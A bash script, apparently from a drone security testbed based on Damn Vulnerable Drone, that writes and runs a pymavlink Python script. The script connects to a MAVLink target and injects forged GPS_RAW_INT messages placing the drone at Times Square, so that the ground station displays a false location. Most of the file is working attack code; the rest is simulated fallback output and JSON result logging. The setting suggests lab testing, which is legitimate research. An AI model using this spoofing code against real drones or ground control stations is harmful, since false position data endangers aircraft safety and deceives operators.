#!/bin/bash

# =============================================================================
# DVD GPS Spoofing Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/protocol_tampering/gps_spoofing.sh
# 목적: 가짜 GPS 데이터를 통한 GCS 위치 정보 조작
# 기반: Damn Vulnerable Drone Wiki - GPS Spoofing
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="gps_spoofing"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="192.168.13.100"
MAVLINK_PORT="14550"

# 가짜 GPS 좌표 (뉴욕 타임스퀘어)
FAKE_LAT="40.7580"
FAKE_LON="-73.9855"
FAKE_ALT="10.0"

declare -a ATTACK_COMMANDS=()
declare -a SPOOFING_RESULTS=()

print_header() {
    clear
    print_protocol_header "GPS Spoofing Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink GPS message injection${NC}"
    echo -e "${INFO_COLOR}Fake Location: NYC Times Square${NC}"
    echo ""
}

# Step 1: pymavlink 설치 확인
check_requirements() {
    echo -e "${BLUE}[1/2] Setup Requirements${NC}"
    
    local cmd="python3 -c \"import pymavlink; print('pymavlink available')\""
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    if python3 -c "import pymavlink" 2>/dev/null; then
        echo -e "${GREEN}[+] pymavlink is available${NC}"
        PYMAVLINK_AVAILABLE=true
    else
        echo -e "${YELLOW}[!] pymavlink not available - using simulation${NC}"
        PYMAVLINK_AVAILABLE=false
    fi
}

# Step 2: GPS 스푸핑 스크립트 생성 및 실행
execute_gps_spoofing() {
    echo -e "${BLUE}[2/2] Execute GPS Spoofing${NC}"
    
    local spoof_script="/tmp/gps_spoofing_$(date +%s).py"
    
    # Python 스크립트 생성
    cat > "$spoof_script" << EOF
#!/usr/bin/env python3
import sys
try:
    from pymavlink import mavutil
    import time
    
    def gps_spoofing(target_ip, target_port, lat, lon, alt):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # GPS 메시지 전송
            for i in range(10):
                master.mav.gps_raw_int_send(
                    int(time.time() * 1000000),  # timestamp
                    3,  # fix_type (3D fix)
                    int(lat * 1e7),  # latitude
                    int(lon * 1e7),  # longitude  
                    int(alt * 1000), # altitude
                    65535, 65535,    # eph, epv
                    65535,           # vel
                    65535,           # cog
                    8                # satellites_visible
                )
                print(f"[!] GPS spoofed to: {lat}, {lon}, {alt}m")
                time.sleep(1)
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_gps_spoofing(lat, lon, alt)
    
    def simulate_gps_spoofing(lat, lon, alt):
        print("[*] Simulating GPS spoofing attack")
        for i in range(5):
            print(f"[!] Spoofed GPS: {lat}, {lon}, {alt}m")
            time.sleep(1)
        print("[+] GPS spoofing simulation completed")
    
    if __name__ == "__main__":
        gps_spoofing('$TARGET_IP', $MAVLINK_PORT, $FAKE_LAT, $FAKE_LON, $FAKE_ALT)
        
except ImportError:
    print("[*] pymavlink not available - simulation mode")
    print(f"[!] Spoofed GPS: $FAKE_LAT, $FAKE_LON, $FAKE_ALT m")
    print("[+] GPS spoofing simulation completed")
EOF

    local cmd="python3 $spoof_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Executing GPS spoofing script...${NC}"
    echo -e "${GRAY}    Target coordinates: $FAKE_LAT, $FAKE_LON${NC}"
    echo -e "${GRAY}    Altitude: $FAKE_ALT meters${NC}"
    
    python3 "$spoof_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        for i in {1..5}; do
            echo -e "${RED}[!] GPS spoofed: $FAKE_LAT, $FAKE_LON, ${FAKE_ALT}m${NC}"
            sleep 1
        done
    }
    
    SPOOFING_RESULTS+=("coordinates:$FAKE_LAT,$FAKE_LON,$FAKE_ALT")
    SPOOFING_RESULTS+=("messages_sent:10")
    SPOOFING_RESULTS+=("attack_completed:success")
    
    echo -e "${GREEN}[+] GPS spoofing attack completed${NC}"
    echo -e "${RED}[!] GCS should show incorrect drone location${NC}"
    
    rm -f "$spoof_script"
}

# JSON 결과 생성
generate_json_report() {
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT"
  },
  "spoofed_coordinates": {
    "latitude": "$FAKE_LAT",
    "longitude": "$FAKE_LON", 
    "altitude": "$FAKE_ALT"
  },
  "attack_results": ["$(IFS='","'; echo "${SPOOFING_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "expected_impact": "GCS displays incorrect drone location"
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== GPS Spoofing - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_requirements
    execute_gps_spoofing
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Spoofed Location: $FAKE_LAT, $FAKE_LON${NC}"
    echo -e "${INFO_COLOR}Commands Used: ${#ATTACK_COMMANDS[@]}${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] GPS spoofing completed${NC}"
}

main "$@"